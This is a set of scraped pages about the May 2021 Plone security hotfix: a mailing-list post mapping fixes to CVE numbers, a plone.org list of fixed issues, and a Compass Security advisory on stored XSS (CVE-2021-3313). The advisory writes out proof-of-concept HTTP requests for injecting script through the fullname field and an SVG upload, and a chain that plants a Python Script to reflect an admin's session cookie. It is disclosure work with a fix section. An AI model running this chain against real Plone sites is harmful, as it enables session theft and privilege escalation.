=== Content from www.openwall.com_031e3e56_20250114_205325.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2021/05/21/1) [[next>]](../../../2021/05/25/1) [[<thread-prev]](../../../2021/05/21/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <dbbd5c0a-cebb-dfed-3c21-967513642d38@vanrees.org>
Date: Sat, 22 May 2021 13:34:10 +0200
From: Maurits van Rees <maurits@...rees.org>
To: oss-security@...ts.openwall.com
Subject: Re: Plone security hotfix 20210518

CVE numbers inline below. Thanks.

On 21/05/2021 16:07, Maurits van Rees wrote:
> A Plone security hotfix was released on Tuesday, May 18 2021.
> For details, see <https://plone.org/security/hotfix/20210518>
> Most CVE numbers are not yet issued. I will request them from Mitre
> shortly.
>
> BTW, I am following the instructions at
> <https://oss-security.openwall.org/wiki/mailing-lists/oss-security#cve-requests>
> to first post to this list, then request CVEs at Mitre, then reply to
> my own post.
> I don't see many other people doing it in this order. Is that page
> still accurate?
>
> Versions Affected: All supported Plone versions (4.3.20 and any
> earlier 4.3.x version, 5.2.4 and any earlier 5.x version).
>
> Versions Not Affected: None. Earlier versions may be affected, but the
> hotfix has not been tested on them.
>
> The patch addresses several security issues:
>
> - Remote Code Execution via traversal in expressions. Reported by
> David Miller. CVE-2021-32633.
> - Writing arbitrary files via docutils and Python Script. Reported by
> Calum Hutton.

CVE-2021-33509

> - Various information disclosures: mostly installation logs. Reported
> by Calum Hutton. CVE-2021-21360 and CVE-2021-21336.
> - Stored XSS from file upload (svg, html). Reported separately by Emir
> Cüneyt Akkutlu and Tino Kautschke.

CVE-2021-33512

> - Reflected XSS in various spots. Reported by Calum Hutton.

CVE-2021-33507

> - XSS vulnerability in CMFDiffTool. Reported by Igor Margitich.

CVE-2021-33513

> - Stored XSS from user fullname. Reported by Tino Kautschke.

CVE-2021-33508 issued, but I forgot that the original reporter already reserved CVE-2021-3313 which is public now with his report.  My bad.

> - Blind SSRF via feedparser accessing an internal URL. Reported by
> Subodh Kumar Shree.
The reporter prefered to request the CVE for this one, so waiting to
hear back.
> - Server Side Request Forgery via event ical URL. Reported by
> MisakiKata and David Miller.

CVE-2021-33510

> - Server Side Request Forgery via lxml parser. Reported by MisakiKata
> and David Miller.

CVE-2021-33511

>
> A hotfix package has been created at
> <https://pypi.org/project/Products.PloneHotfix20210518/>
> The fixes will be incorporated in future release Plone 5.2.5.
>
--
Maurits van Rees <https://maurits.vanrees.org/>

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from plone.org_79ae3fb5_20250114_205328.html ===
[Skip to main content](#view)[Skip to navigation](#navigation)[Skip to footer](#footer)[![Plone.org logo](/static/media/logo.cab945d8.svg "Plone.org logo")](/ "Plone.org")Why Plone
## Why Plone

* [What is Plone?](/why-plone/what-is-plone)
* [Features](/why-plone/features)
* [Plone 6](/why-plone/plone-6)
* [They use Plone](/why-plone/they-use-plone)
* [Extend Plone](/why-plone/extend-plone)
* [Roadmap](/why-plone/roadmap)
* [Plone as a Headless CMS](/why-plone/plone-as-a-headless-cms)
[Why Plone](/why-plone)Get Started
## Get Started with Plone

* [Try Plone](/get-started/try-plone)
* [Install Plone](/get-started/download-plone)
* [Documentation](/get-started/documentation)
* [Training](/get-started/attend-training)
[Get Started](/get-started)Services
## Services

* [Providers](/services/providers)
* [Training](/services/training)
[Services](/services)Community
## Community

* [Bugs](/community/bugs)
* [Conferences](/community/conferences)
* [Contribute](/community/contribute)
* [Forum](/community/forum)
* [Google Summer of Code](/community/gsoc)
* [Online Chat](/community/chat)
* [Support](/community/support)
* [Teams](/community/teams)
[Community](/community)Foundation
## Plone Foundation

* [About the Plone Foundation](/foundation/about)
* [Board of Directors](/foundation/board)
* [Membership](/foundation/members)
* [Meetings](/foundation/meetings)
* [How to Sponsor Plone](/foundation/sponsorship)
* [Plone Event and Sprint Sponsorship Policy](/foundation/event-sponsorship)
* [Copyright, Licensing: Plone Code & Logo](/foundation/copyright-licensing-logo)
* [Contact us](/foundation/contact-us)
[Foundation](/foundation)News & Events
## News and Events

* [News](/news-and-events/news)
* [Events](/news-and-events/events)
* [Podcasts](/news-and-events/podcasts)
* [The Plone Newsroom](/news-and-events/plone-newsroom)
* [Plone Podcast](/news-and-events/plone-podcast)
* [Plone in Social Media](/news-and-events/plone-in-social-media)
* [Plone YouTube channel](/news-and-events/plone-youtube-channel)
* [Conferences](/news-and-events/conferences)
* [Sprints](/news-and-events/sprints)
* [Plone Tune-Up Days](/news-and-events/plone-tune-up-days)
* [World Plone Day 2024](/news-and-events/world-plone-day-2024)
* [Plone Conference 2024](/news-and-events/plone-conference-2024)
* [Join the Plone Newsletter](/news-and-events/join-the-plone-newsletter)
[News and Events](/news-and-events)[Try now](/try-plone)[Home](/ "Home")/[Security](/security)/[Plone Hotfix Descriptions](/security/hotfix)/20210518
# 20210518

### Issues fixed

[Remote Code Execution via traversal in expressions with aliases](/security/hotfix/20210518/remote-code-execution-via-traversal-in-expressions "vulnerability")[Remote Code Execution via traversal in expressions part 2](/security/hotfix/20210518/copy_of_remote-code-execution-via-traversal-in-expressions-2 "vulnerability")[Writing arbitrary files via docutils and Python Script](/security/hotfix/20210518/writing-arbitrary-files-via-docutils-and-python-script "vulnerability")[Information disclosures: mostly installation logs](/security/hotfix/20210518/various-information-disclosures "vulnerability")[Stored XSS from file upload (svg, html)](/security/hotfix/20210518/stored-xss-from-file-upload-svg-html "vulnerability")[Reflected XSS in various spots](/security/hotfix/20210518/reflected-xss-in-various-spots "vulnerability")[XSS vulnerability in CMFDiffTool](/security/hotfix/20210518/xss-vulnerability-in-cmfdifftool "vulnerability")[Stored XSS from user fullname](/security/hotfix/20210518/stored-xss-from-user-fullname "vulnerability")[Blind SSRF via feedparser accessing an internal URL](/security/hotfix/20210518/blind-ssrf-via-feedparser-accessing-an-internal-url "vulnerability")[Server Side Request Forgery via event ical URL](/security/hotfix/20210518/server-side-request-forgery-via-event-ical-url "vulnerability")[Server Side Request Forgery via lxml parser](/security/hotfix/20210518/server-side-request-forgery-via-lxml-parser "vulnerability")[Stored XSS in folder contents](/security/hotfix/20210518/stored-xss-in-folder-contents "vulnerability")[Remote Code Execution via Python Scripts](/security/hotfix/20210518/remote-code-execution-via-python-scripts "vulnerability");[About Plone](/why-plone)[Try Plone](/try-plone)[Download Plone](/download)[Plone Releases](/download/releases)[Documentation](https://6.docs.plone.org)[Training](https://training.plone.org)[Security](/security)[Roadmap](/roadmap)[GitHub](https://github.com/plone)[Community](/community)[Forum](https://community.plone.org/)[Chat](/community/chat)[Contribute code](/contribute)[Report an issue](/community/bugs)[News and events](/news-and-events)[Conference](https://ploneconf.org)[Join the Plone newsletter](/news-and-events/join-the-plone-newsletter)[Foundation](/foundation)[Join the foundation](/foundation/members/application-procedure)[Board](/foundation/board)[Donate](https://github.com/sponsors/plone)[Sponsors](/foundation/sponsorship)[Code of conduct](/foundation/materials/foundation-resolutions/code-of-conduct)[Foundation members](/foundation/members)[Shop](https://plone.teemill.com/)[Follow us](/news-and-events/plone-in-social-media)[Mastodon](https://plone.social/%40plone)[Twitter](https://twitter.com/plone)[Instagram](https://www.instagram.com/plonecms/)[YouTube](https://www.youtube.com/%40plonecms)[Linkedin](https://www.linkedin.com/company/plone-foundation/)[Facebook](https://www.facebook.com/plonecms)[Privacy Policy](/privacy-policy)Cookie settings[![Plone.org logo](/static/media/logo.cab945d8.svg "Plone.org logo")](/ "Plone.org")The text and illustrations in this website are licensed by the Plone Foundation under a Creative Commons Attribution-ShareAlike 4.0 International license. Plone and the Plone® logo are registered trademarks of the Plone Foundation, registered in the United States and other countries. For guidelines on the permitted uses of the Plone trademarks, see https://plone.org/foundation/logo. All other trademarks are owned by their respective owners.

=== Content from plone.org_f5c8fd05_20250114_205327.html ===
[Skip to main content](#view)[Skip to navigation](#navigation)[Skip to footer](#footer)[![Plone.org logo](/static/media/logo.cab945d8.svg "Plone.org logo")](/ "Plone.org")Why Plone
## Why Plone

* [What is Plone?](/why-plone/what-is-plone)
* [Features](/why-plone/features)
* [Plone 6](/why-plone/plone-6)
* [They use Plone](/why-plone/they-use-plone)
* [Extend Plone](/why-plone/extend-plone)
* [Roadmap](/why-plone/roadmap)
* [Plone as a Headless CMS](/why-plone/plone-as-a-headless-cms)
[Why Plone](/why-plone)Get Started
## Get Started with Plone

* [Try Plone](/get-started/try-plone)
* [Install Plone](/get-started/download-plone)
* [Documentation](/get-started/documentation)
* [Training](/get-started/attend-training)
[Get Started](/get-started)Services
## Services

* [Providers](/services/providers)
* [Training](/services/training)
[Services](/services)Community
## Community

* [Bugs](/community/bugs)
* [Conferences](/community/conferences)
* [Contribute](/community/contribute)
* [Forum](/community/forum)
* [Google Summer of Code](/community/gsoc)
* [Online Chat](/community/chat)
* [Support](/community/support)
* [Teams](/community/teams)
[Community](/community)Foundation
## Plone Foundation

* [About the Plone Foundation](/foundation/about)
* [Board of Directors](/foundation/board)
* [Membership](/foundation/members)
* [Meetings](/foundation/meetings)
* [How to Sponsor Plone](/foundation/sponsorship)
* [Plone Event and Sprint Sponsorship Policy](/foundation/event-sponsorship)
* [Copyright, Licensing: Plone Code & Logo](/foundation/copyright-licensing-logo)
* [Contact us](/foundation/contact-us)
[Foundation](/foundation)News & Events
## News and Events

* [News](/news-and-events/news)
* [Events](/news-and-events/events)
* [Podcasts](/news-and-events/podcasts)
* [The Plone Newsroom](/news-and-events/plone-newsroom)
* [Plone Podcast](/news-and-events/plone-podcast)
* [Plone in Social Media](/news-and-events/plone-in-social-media)
* [Plone YouTube channel](/news-and-events/plone-youtube-channel)
* [Conferences](/news-and-events/conferences)
* [Sprints](/news-and-events/sprints)
* [Plone Tune-Up Days](/news-and-events/plone-tune-up-days)
* [World Plone Day 2024](/news-and-events/world-plone-day-2024)
* [Plone Conference 2024](/news-and-events/plone-conference-2024)
* [Join the Plone Newsletter](/news-and-events/join-the-plone-newsletter)
[News and Events](/news-and-events)[Try now](/try-plone)[Home](/ "Home")/[Install Plone 6](/download)/[Recent Plone Releases](/download/releases)/Plone 5.2.3
# Plone 5.2.3

;[About Plone](/why-plone)[Try Plone](/try-plone)[Download Plone](/download)[Plone Releases](/download/releases)[Documentation](https://6.docs.plone.org)[Training](https://training.plone.org)[Security](/security)[Roadmap](/roadmap)[GitHub](https://github.com/plone)[Community](/community)[Forum](https://community.plone.org/)[Chat](/community/chat)[Contribute code](/contribute)[Report an issue](/community/bugs)[News and events](/news-and-events)[Conference](https://ploneconf.org)[Join the Plone newsletter](/news-and-events/join-the-plone-newsletter)[Foundation](/foundation)[Join the foundation](/foundation/members/application-procedure)[Board](/foundation/board)[Donate](https://github.com/sponsors/plone)[Sponsors](/foundation/sponsorship)[Code of conduct](/foundation/materials/foundation-resolutions/code-of-conduct)[Foundation members](/foundation/members)[Shop](https://plone.teemill.com/)[Follow us](/news-and-events/plone-in-social-media)[Mastodon](https://plone.social/%40plone)[Twitter](https://twitter.com/plone)[Instagram](https://www.instagram.com/plonecms/)[YouTube](https://www.youtube.com/%40plonecms)[Linkedin](https://www.linkedin.com/company/plone-foundation/)[Facebook](https://www.facebook.com/plonecms)[Privacy Policy](/privacy-policy)Cookie settings[![Plone.org logo](/static/media/logo.cab945d8.svg "Plone.org logo")](/ "Plone.org")The text and illustrations in this website are licensed by the Plone Foundation under a Creative Commons Attribution-ShareAlike 4.0 International license. Plone and the Plone® logo are registered trademarks of the Plone Foundation, registered in the United States and other countries. For guidelines on the permitted uses of the Plone trademarks, see https://plone.org/foundation/logo. All other trademarks are owned by their respective owners.

=== Content from www.compass-security.com_6aadd8c5_20250114_205329.html ===
###############################################################
#
# COMPASS SECURITY ADVISORY
# https://www.compass-security.com/research/advisories/
#
###############################################################
#
# Product: Plone
# Vendor: Plone Foundation
# CSNC ID: CSNC-2021-013
# CVE ID: CVE-2021-3313
# Subject: Cross-Site Scripting (XSS)
# Risk: Critical
# Effect: Remotely Exploitable
# Author: Tino Kautschke
# Date: 26.01.2021
#
###############################################################
Introduction
------------
Plone is a free and open source content management system built
on top of the Zope application server. Plone is positioned as an
"Enterprise CMS" and is commonly used for intranets and as part
of the web presence of large organizations. High-profile public
sector users include the U.S. Federal Bureau of Investigation,
Brazilian Government, United Nations, City of Bern (Switzerland),
New South Wales Government (Australia), and European Environment
Agency. [1]
Compass Security identified a stored Cross-Site Scripting (XSS)
vulnerability in the Plone CMS. Successful exploitation requires
authentication and can be performed remotely.
Affected
--------
Vulnerable:
\* Plone 5.2.2 (5209)
\* Plone 5.2.1 (5208)
Not tested:
\* Plone 5.2.3
\* Plone 5.2.4
Not vulnerable:
\* Plone 5.2.4 (with hotfix 20210518)
\* Plone 5.2.5
Technical Description
---------------------
The user input data is not properly encoded, when returned back to
the user's browser. The browser will interpret data as JavaScript,
when visiting a vulnerable page.
An exploitation of this vulnerability allows for:
- Privilege Escalation by stealing the session cookie of a higher
privileged user, which is able to deploy Plone-PythonScripts.
- Stealing or manipulation of user data
- Redirection of a user to a Phishing page
In following, two example attack vectors for XSS, then the privilege
escalation path using XSS with 3 requests against a higher privileged
user:
Example #1:
This one depends on configuration of the backend systems.
The XSS payload can be placed by changing the own user fullname.
Possible as low privileged user. The script will be executed on
the "Edit Page" in "Ownership"-Settings, when searching for the
user with the XSS payload in username.
Request:
POST /Plone/@@personal-information HTTP/1.1
Host: kali:8080
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------304504525237700496553549953184
Content-Length: 1239
DNT: 1
Connection: close
Referer: http://kali:8080/Plone/@@personal-information
Cookie: \_\_ac="i199f0fpDE71Q4GCB9PypX3PUZcnJctWyfgsiLu55282MDBlZTQxOGNzbmMh"
Upgrade-Insecure-Requests: 1
-----------------------------304504525237700496553549953184
Content-Disposition: form-data; name="form.widgets.fullname"
xss poc ![](x)
-----------------------------304504525237700496553549953184
[cut]
Example #2:
The fileupload is vulnerable to XSS. As user with the privilege to
upload files, it is possible to upload an SVG image with XSS payload.
The uploaded SVG file with XSS is accessible to unauthenticated users.
The payload will be executed because of the content type image/svg+xml.
Request:
POST /Plone//fileUpload HTTP/1.1
Host: kali:8080
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
X-Requested-With: XMLHttpRequest
X-CSRF-TOKEN: 11b9debc2ae98a62580db8774af04e5ab8ec9036
Content-Type: multipart/form-data; boundary=---------------------------349630636412758476432176011885
Content-Length: 586
Origin: http://kali:8080
Connection: close
Referer: http://kali:8080/Plone/folder\_contents?\_authenticator=11b9debc2ae98a62580db8774af04e5ab8ec9036
Cookie: \_\_ac="NjE2NDZkNjk2ZTo2MTY0NmQ2OTZl"; plone-toolbar=%7B%22expanded%22%3Atrue%7D
-----------------------------349630636412758476432176011885
Content-Disposition: form-data; name="file"; filename="xss.svg"
Content-Type: image/svg+xml
xml version="1.0" standalone="no"?

-----------------------------349630636412758476432176011885--
Requesting the uploaded as unauthenticated user:
The payload will be executed because of the content type image/svg+xml.
E.g.: http://kali:8080/Plone/xss.svg
Request:
GET /Plone/xss.svg HTTP/1.1
Host: kali:8080
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Response:
HTTP/1.1 200 OK
Accept-Ranges: bytes
Connection: close
Content-Length: 364
Content-Type: image/svg+xml
Date: Mon, 25 Jan 2021 16:07:40 GMT
Server: waitress
Via: waitress
X-Frame-Options: SAMEORIGIN
X-Powered-By: Zope (www.zope.org), Python (www.python.org)
xml version="1.0" standalone="no"?

For privilege escalation it is possible to prepare an XSS payload,
which will send 3 requests to create a Plone Python Script in
context of an admin user:
1. Getting the Plone CSRF token from a response of a simple GET /
There is something like this in body content:

2. Placing the following Plone Python Script to reflect session cookies:
print(context.REQUEST)
return printed
Request:
POST /Plone/manage\_addProduct/PythonScripts/manage\_addPythonScript HTTP/1.1
Host: kali:8080
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: http://kali:8080
Connection: close
Referer: http://kali:8080/Plone/
Cookie: \_\_ac="NjE2NDZkNjk2ZTo2MTY0NmQ2OTZl"; plone-toolbar=%7B%22expanded%22%3Atrue%7D
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 153
id=TestScript1&title=TestScript1&file=print%28context.REQUEST%29%0areturn+printed%0a&submit=Add&\_authenticator=26a38775f066aec64afeef1db81f0cb870756fab
3. Requesting the Plone-PythonScript to parse the reflected session cookie:
Request:
GET /Plone/TestScript1 HTTP/1.1
Host: kali:8080
User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,\*/\*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: \_\_ac="NjE2NDZkNjk2ZTo2MTY0NmQ2OTZl"; plone-toolbar=%7B%22expanded%22%3Atrue%7D
Upgrade-Insecure-Requests: 1
Response:
HTTP/1.1 200 OK
Connection: close
Content-Length: 5004
Content-Type: text/html; charset=utf-8
Date: Mon, 25 Jan 2021 16:38:12 GMT
Server: waitress
Via: waitress
X-Frame-Options: SAMEORIGIN
X-Powered-By: Zope (www.zope.org), Python (www.python.org)
[cut]| HTTP\_COOKIE | '\_\_ac="NjE2NDZkNjk2ZTo2MTY0NmQ2OTZl"; plone-toolbar=%7B%22expanded%22%3Atrue%7D' |
[cut]
Vulnerability Classification
----------------------------
CVSS v3.1 Metrics [2]:
\* CVSS Base Score: 7.6
\* CVSS Vector: AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:L
Workaround / Fix
----------------
User input must be correctly encoded to ensure it is not possible to
execute JavaScript in context of the user's browser, when embedded into
the web page. For HTML body content, use HTML encoding:
- < -> <
- > -> >
- " -> "
- ' -> '
- & -> &
File downloads should be enforced using the response header
"Content-Disposition: attachment".
A Content-Security Policy without allowing 'unsafe-inline' script
is recommended as second layer of protection.
Plone-PythonScripts should be restricted to prevent a session
cookie reflection.
As Plone user, please update your installation to the latest version.
Timeline
--------
2021-01-26: Discovery by Tino Kautschke
2021-01-26: Initial vendor notification
2021-01-26: Assigned CVE-2021-3313
2021-01-27: Initial vendor response
2021-02-15: Vendor partially confimed the issues
2021-03-18: Vendor confimed the issues and planned a hotfix
2021-05-18: Hotfix released / public disclosure [3][4][5]
References
----------
[1] Jan 2021 https://en.wikipedia.org/wiki/Plone\_(software)
[2] https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:L&version=3.1
[3] https://plone.org/security/hotfix/20210518
[4] https://plone.org/security/hotfix/20210518/stored-xss-from-file-upload-svg-html
[5] https://plone.org/security/hotfix/20210518/stored-xss-from-user-fullname
